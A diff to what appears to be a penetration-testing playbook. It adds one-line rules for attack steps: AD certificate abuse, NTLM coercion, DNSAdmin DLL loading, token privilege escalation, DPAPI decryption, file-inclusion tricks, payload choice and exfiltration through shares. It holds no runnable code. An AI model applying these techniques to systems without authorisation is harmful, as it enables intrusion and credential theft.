+## ADCS-10. What decides this step?
+
+Weak mapping lets a certificate carrying another UPN authenticate as them.
+
 ## COERCE-01. What decides this step?
 
 A successful coerce proves the target authenticates to your listener.
@@ -5338,6 +5994,22 @@ Unconstrained delegation caches a DC ticket when the DC is coerced.
 ## TRUST-01. What decides this step?
 
 A listed trust is only reachable with an identity valid on the other side.
+
+## ADIDNS-01. What decides this step?
+
+A DNS record can point a trusted name at Kali.
+
+## DNSADM-01. What decides this step?
+
+The DNS plugin DLL runs as the service on restart.
+
+## SHADOW-01. What decides this step?
+
+A shadow credential authenticates without changing the password.
+
+## DELEG-04. What decides this step?
+
+Without protocol transition, the delegating ticket comes first.
 
 ## PASS-01. What decides this step?
 
@@ -5407,6 +6079,22 @@ An elevated task can run as SYSTEM without a service change.
 ## WPRIV-06. What decides this step?
 
 An all-users startup entry runs at the next administrator logon.
+
+## WPRIV-07. What decides this step?
+
+A reviewed vulnerable driver needs the load privilege and a loader.
+
+## WPRIV-08. What decides this step?
+
+Token creation privileges reuse an existing SYSTEM token.
+
+## WPRIV-09. What decides this step?
+
+A Medium label with admin membership means filtered admin.
+
+## WPRIV-10. What decides this step?
+
+DPAPI files decrypt only with the owning user's masterkey.
 
 ## DNS-01. What decides this step?
 
@@ -5480,6 +6168,14 @@ Oracle returns identity and owned objects only, no OS command.
 
 `pg_read_binary_file` reads one bounded server-side file.
 
+## DB-12. What decides this step?
+
+A UDF writes a shared object into the plugin directory.
+
+## DB-13. What decides this step?
+
+ODAT needs an exposed listener and usable credentials.
+
 ## DB-03. What decides this step?
 
 sqlcmd proves the SQL login; TLS failure is not a credential verdict.
@@ -5491,6 +6187,18 @@ Login, role and configuration are separate facts.
 ## DB-05. What decides this step?
 
 `xp_cmdshell` proves the service account, then the settings are restored.
+
+## DB-09. What decides this step?
+
+Impersonation needs the exact server or database grant.
+
+## DB-10. What decides this step?
+
+A linked server can carry a different login mapping.
+
+## DB-11. What decides this step?
+
+xp_dirtree coerces NTLM; db_owner is a separate database right.
 
 ## MAIL-01. What decides this step?
 
@@ -5536,6 +6244,26 @@ The Groovy console executes on the controller.
 
 The BMC default credential and its hash are the useful outputs.
 
+
+## VNC-01. What decides this step?
+
+VNC is a desktop path and a password-file target.
+
+## NTP-01. What decides this step?
+
+NTP matters mainly for Kerberos clock skew.
+
+## X11-01. What decides this step?
+
+An open X server can be read without authentication.
+
+## SQUID-01. What decides this step?
+
+An open proxy reaches internal HTTP from Kali.
+
+## GENERIC-01. What decides this step?
+
+Confirm protocol, take the version, find source, then check prerequisites.
 
 ## WREAD-01. What decides this step?
 
@@ -5609,6 +6337,10 @@ The marker must match byte for byte at the returned URL.
 
 The proof file returns identity and can open one callback.
 
+## WUPLOAD-03. What decides this step?
+
+Declared type, double extension and magic bytes test different gates.
+
 ## WEDIT-01. What decides this step?
 
 The template is captured, replaced, proven and restored.
@@ -5658,6 +6390,22 @@ A JWT that accepts a tampered claim is an auth bypass.
 
 A callback proves reflected script execution.
 
+## WEB-24. What decides this step?
+
+A filter chain reads source when wrappers are filtered.
+
+## WEB-25. What decides this step?
+
+A value stored in the session file becomes executable when included.
+
+## WEB-26. What decides this step?
+
+JSON operators and LDAP filters replace SQL syntax.
+
+## WEB-27. What decides this step?
+
+Introspection and redirect handling are the cheap API checks.
+
 ## EXP-01. What decides this step?
 
 Candidate review compares every prerequisite, not a title.
@@ -5685,6 +6433,34 @@ Hash the file on both sides; transfer does not execute it.
 ## XFER-02. What decides this step?
 
 Only an authenticated encrypted copy protects sensitive files.
+
+## XFER-03. What decides this step?
+
+Any available download primitive reaches the same staged file.
+
+## XFER-04. What decides this step?
+
+Exfiltrate through a writeable share or upload endpoint.
+
+## MSF-01. What decides this step?
+
+Review rank, target, payload and options before spending the allowance.
+
+## MSF-02. What decides this step?
+
+One configured attempt with reviewed options.
+
+## MSF-03. What decides this step?
+
+Sessions, routes and port forwards are separate from a proxy.
+
+## PAY-01. What decides this step?
+
+Reverse when egress works; bind when only the target can listen.
+
+## PAY-02. What decides this step?
+
+Architecture and staged/stageless matter more than the format.
 
 ## PIVOT-01. What decides this step?
 
